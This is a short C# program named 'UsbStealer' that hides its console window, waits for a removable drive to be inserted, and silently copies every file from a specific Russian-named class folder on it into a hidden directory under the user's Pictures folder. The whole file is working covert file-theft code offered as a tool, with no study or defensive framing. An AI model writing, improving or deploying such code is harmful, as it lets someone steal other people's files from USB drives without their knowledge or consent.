﻿using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;

namespace UsbStealer
{
    class Program
    {
        const int SW_HIDE = 0;
        const int SW_SHOW = 5;
        const int SW_Min = 2;
        const int SW_Max = 3;
        const int SW_Norm = 4;

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        [STAThread]
        static void Main(string[] args)
        {
            var handle = GetConsoleWindow();

            //скрыть консоль
            ShowWindow(handle, SW_HIDE);
            
            while (true)
            {
                Thread.Sleep(1000);
                foreach (var dinfo in DriveInfo.GetDrives())
                {
                    if (dinfo.DriveType == DriveType.Removable && dinfo.IsReady == true)
                    {
                        var path = dinfo.Name + @"смолгу\!для занятий\4П7_АИС";
                        var newPath = KnownFolders.GetPath(KnownFolder.Pictures) + @"\нужное";

                        if (Directory.Exists(path))
                        {
                            CreateDirectoies(path, newPath);
                            CopyFiles(path, newPath);
                            return;
                        }
                    }
                }
            }
        }

        private static void CopyFiles(string path, string newPath)
        {
            var directoryInfo = new DirectoryInfo(path);
            var files = directoryInfo.GetFiles("*.*", SearchOption.AllDirectories);

            foreach (var file in files)
            {
                var newFilePath = file.FullName.Replace(path, newPath);
                try
                {
                    file.CopyTo(newFilePath);
                }
                catch
                {
                }
            }
        }

        private static void CreateDirectoies(string path, string newPath)
        {
            DirectoryInfo dinfo = Directory.CreateDirectory(path.Replace(path, newPath));
            dinfo.Attributes = FileAttributes.Directory | FileAttributes.Hidden;
            var directories = Directory.GetDirectories(path, "*", SearchOption.AllDirectories);
            foreach (var directory in directories)
            {
                try
                {
                    Directory.CreateDirectory(directory.Replace(path, newPath));
                }
                catch
                {
                }
            }
        }
    }
}
